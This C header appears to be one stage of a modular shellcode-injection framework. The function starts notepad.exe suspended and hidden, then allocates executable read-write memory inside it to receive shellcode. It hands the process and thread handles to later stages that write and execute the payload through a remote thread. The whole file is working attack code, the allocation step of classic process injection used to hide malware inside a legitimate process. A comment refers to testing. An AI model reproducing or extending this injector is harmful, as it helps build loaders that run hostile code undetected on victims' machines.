#pragma once
#include "../../api/api_wrappers.h"
#include "../../core/utils.h"
#include "../context.h"

// T2.3 — Remote allocation
//
// Spawns a target process suspended (notepad.exe by default) and allocates
// memory inside it for the shellcode. The target_process and target_thread
// handles are stored in the context for L4 (write) and L5 (execute) to
// consume. Must be paired with T4.3 (write_remote) and T5.4 (exec_remote_thread).
inline BOOL Stage2_Alloc_Remote(TechniqueContext* ctx)
{
    if (!ctx) return FALSE;

    STARTUPINFOA si       = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    // CREATE_NO_WINDOW keeps notepad invisible during the test.
    if (!CreateProcessA(
            "C:\\Windows\\System32\\notepad.exe",
            NULL, NULL, NULL, FALSE,
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            NULL, NULL, &si, &pi))
    {
#ifdef DEBUG_MODE
        DEBUG_MSG("Stage 2", "CreateProcess failed: %lu", GetLastError());
#endif
        return FALSE;
    }

    ctx->target_process = pi.hProcess;
    ctx->target_thread  = pi.hThread;

    ctx->allocated_mem = (unsigned char*)MyVirtualAllocEx(
                            pi.hProcess,
                            NULL,
                            ctx->length,
                            MEM_COMMIT | MEM_RESERVE,
                            PAGE_EXECUTE_READWRITE
                        );

#ifdef DEBUG_MODE
    if (ctx->allocated_mem) {
        DEBUG_MSG("Stage 2", "Remote alloc %llu bytes at %p in pid %lu",
                  ctx->length, ctx->allocated_mem, pi.dwProcessId);
    } else {
        DEBUG_MSG("Stage 2", "Remote alloc failed in pid %lu", pi.dwProcessId);
    }
#endif

    return ctx->allocated_mem != NULL;
}
